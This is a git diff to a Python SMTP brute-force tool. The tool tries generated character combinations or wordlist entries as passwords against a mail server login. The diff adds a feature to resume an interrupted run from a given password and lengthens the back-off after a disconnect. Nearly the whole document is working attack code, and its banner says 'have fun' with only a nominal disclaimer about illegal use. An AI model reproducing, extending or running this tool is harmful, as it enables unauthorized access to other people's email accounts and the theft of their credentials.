@@ -5,7 +5,7 @@ import itertools
 import smtplib
 import time 
 
-#############################################   By Yaya7211 https://github.com/yaya7211 #########################################################################
+######################################################################### By Yaya7211 https://github.com/yaya7211 #########################################################################
 
 print("\nWelcome to THE SMTP online Bruteforcer. Have fun. (Plz do not use it for illegal purpose, I'm not responsable about what ur gonna do with this)\nBy Yaya7211\n")
 
@@ -18,26 +18,51 @@ print("Connected !\n \n")
 save = open("Use_this_wordlist.txt", "a")
 
 
-def generateAndBruteForce(cible, minn, maxx, charset) :
-	for n in range(minn, maxx + 1) :
-		for xs in itertools.product(charset, repeat = n ) :
-			charset = ''.join(xs)
-			try :
-				print("Trying password : ", charset)
-				s.login(cible, charset)
-			except smtplib.SMTPAuthenticationError :
-				print("Incorrect password\n")
-				pass
-			except smtplib.SMTPServerDisconnected or ConnectionAbortedError:
-				print("Connection to", serv[0], " failed :/, you should may be check your connection to Internet.\nWaiting a minute before restarting. . .\n")
-				save.write(charset+"\n")
-				time.sleep(60)
-				pass
-			else :
-				print("The password found is ", charset)
-				break
-				save.close()
-				exit()
+def generateAndBruteForce(cible, minn, maxx, charset, choix) :
+	a = 0
+	if choix == "start":
+		for n in range(minn, maxx + 1) :
+			for xs in itertools.product(charset, repeat = n ) :
+				charset = ''.join(xs)
+				try :
+					print("Trying password : ", charset)
+					s.login(cible, charset)
+				except smtplib.SMTPAuthenticationError :
+					print("Incorrect password\n")
+					pass
+				except smtplib.SMTPServerDisconnected or ConnectionAbortedError:
+					print("Connection to", serv[0], " failed :/, you should may be check your connection to Internet.\nWaiting a minute before restarting. . .\n")
+					save.write(charset+"\n")
+					time.sleep(60*5)
+					pass
+				else :
+					print("The password found is ", charset)
+					break
+					save.close()
+					exit()
+	else:
+		for n in range(minn, maxx + 1) :
+			for xs in itertools.product(charset, repeat = n ) :
+				charset = ''.join(xs)
+				if charset == choix:
+					a = 1
+				if a == 1:
+					try :
+						print("Trying password : ", charset)
+						s.login(cible, charset)
+					except smtplib.SMTPAuthenticationError :
+						print("Incorrect password\n")
+						pass
+					except smtplib.SMTPServerDisconnected or ConnectionAbortedError:
+						print("Connection to", serv[0], " failed :/, you should may be check your connection to Internet.\nWaiting a minute before restarting. . .\n")
+						save.write(charset+"\n")
+						time.sleep(60*5)
+						pass
+					else :
+						print("The password found is ", charset)
+						break
+						save.close()
+						exit()
 
 def BruteForceFromWordlist(cible, wordlist, taille) :
 	f = open(wordlist, 'r')
@@ -58,7 +83,7 @@ def BruteForceFromWordlist(cible, wordlist, taille) :
 
 
 if sys.argv[3] == "gen" :
-	generateAndBruteForce(cible, int(sys.argv[4]), int(sys.argv[5]), sys.argv[6])
+	generateAndBruteForce(cible, int(sys.argv[4]), int(sys.argv[5]), sys.argv[6], sys.argv[7])
 	print("No matching password found :/ ")
 	save.close()
 	exit()
@@ -66,4 +91,3 @@ else :
 	BruteForceFromWordlist(cible, sys.argv[4], int(sys.argv[5]))
 	print("No matching password found :/ ")
 	exit()
-
